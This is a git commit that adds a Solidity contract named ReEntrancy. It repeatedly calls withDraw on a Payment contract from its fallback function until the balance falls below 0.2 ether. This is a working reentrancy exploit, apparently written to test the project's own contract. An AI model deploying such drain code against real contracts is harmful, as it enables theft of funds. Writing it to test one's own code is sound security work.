bdb475cdd5058510bfff3eee55cb633a0c941ac6
komus-Israel <komolehinisrael@gmail.com>
2022-04-13 10:38:13 +0100

    created a contract file to execute reEntrancy

---
+++ contracts/utils/WithdrawReEntrancy.sol
@@ -0,0 +1,45 @@
+pragma solidity 0.8.13;
+
+import "../Payment.sol";
+
+
+contract ReEntrancy {
+
+    Payment _payment;
+
+
+    constructor(address _paymentContractAddress) {
+
+        _payment = Payment(payable(_paymentContractAddress));
+    }
+
+    //  contract recieving ether should have a fallback or receive function but payable
+   
+
+    fallback() external payable {
+
+        // attack implementation
+
+        if(address(_payment).balance >= 0.2 ether) {
+
+            _payment.withDraw(5 ether, address(0));
+           
+
+        }
+          
+    }
+
+    
+
+    function attack() external {
+        
+         _payment.withDraw(5 ether, address(0));        
+
+    }
+
+   
+ 
+}
+
+
+
